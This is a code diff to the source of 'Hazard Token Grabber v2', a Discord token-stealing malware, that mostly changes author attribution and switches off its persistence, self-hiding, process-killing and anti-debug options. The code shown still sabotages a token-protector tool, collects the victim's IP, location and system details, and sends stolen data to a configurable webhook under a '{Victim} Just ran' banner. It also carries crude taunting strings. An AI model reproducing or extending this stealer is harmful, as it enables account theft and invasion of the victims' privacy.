@@ -28,13 +28,13 @@ config = {
     # Replace WEBHOOK_HERE with your own webhook. The collected data will be sent to this webhook. ↓↓
     'webhook': "WEBHOOK_HERE",
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
-    'kill_processes': True,
+    'kill_processes': False,
     # This makes the program run the file after every startup.
-    'startup': True,
+    'startup': False,
     # This feature will make the file hide itself after opened.
-    'hide_self': True,
+    'hide_self': False,
     # It does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found.
-    'anti_debug': True,
+    'anti_debug': False,
     # This list of programs will be killed if Hazard-Grabber detects that any of these are running, you can add more or remove programs if you want.
     'blackListedPrograms':
     [
@@ -246,7 +246,7 @@ class Hazard_Token_Grabber_V2(functions):
                     item = json.load(f)
                 except json.decoder.JSONDecodeError:
                     return
-                item['zappelig just raped your token-protector shit LMAOOOO'] = "https://github.com/zappelig"
+                item['zyzzed just raped your token-protector shit LMAOOOO'] = "https://github.com/zyzzed"
                 item['auto_start'] = False
                 item['auto_start_discord'] = False
                 item['integrity'] = False
@@ -264,7 +264,7 @@ class Hazard_Token_Grabber_V2(functions):
                 json.dump(item, f, indent=2, sort_keys=True)
             with open(config, 'a') as f:
                 f.write(
-                    "\n\n//zappelig just raped your token-protector shit LMAOOOO | https://github.com/zappelig")
+                    "\n\n//zyzzed just raped your token-protector shit LMAOOOO | https://github.com/zyzzed")
 
     async def bypassBetterDiscord(self):
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
@@ -484,16 +484,16 @@ class Hazard_Token_Grabber_V2(functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                "🌟・Grabber By github.com/zappelig・https://github.com/zappelig/Hazard-Token-Grabber-v2\n\n")
+                                "🌟・Grabber By github.com/zyzzed・https://github.com/zyzzed/Hazard-Token-Grabber-v2\n\n")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
-                                x+"\n\n🌟・Grabber By github.com/zappelig・https://github.com/zappelig/Hazard-Token-Grabber-v2")
+                                x+"\n\n🌟・Grabber By github.com/zyzzed・https://github.com/zyzzed/Hazard-Token-Grabber-v2")
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
         ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
-        # ip, country, city, region, googlemap = "None"
+        # IP, country, city, region, google maps location
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip')
         city = data.get('city')
@@ -527,7 +527,7 @@ class Hazard_Token_Grabber_V2(functions):
                 {
                     'author': {
                         'name': f'{Victim} Just ran Hazard Token Grabber-v2',
-                        'url': 'https://github.com/zappelig/Hazard-Token-Grabber-v2',
+                        'url': 'https://github.com/zyzzed/Hazard-Token-Grabber-v2',
                         'icon_url': 'https://cdn.discordapp.com/attachments/1018946825585168446/1031610712377802783/200w.gif'
                     },
                     'color': 16119101,
@@ -573,7 +573,7 @@ class Hazard_Token_Grabber_V2(functions):
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/zappelig・https://github.com/zappelig/Hazard-Token-Grabber-v2'
+                        'text': '🌟・Grabber By github.com/zyzzed・https://github.com/zyzzed/Hazard-Token-Grabber-v2'
                     }
                 }
             ]
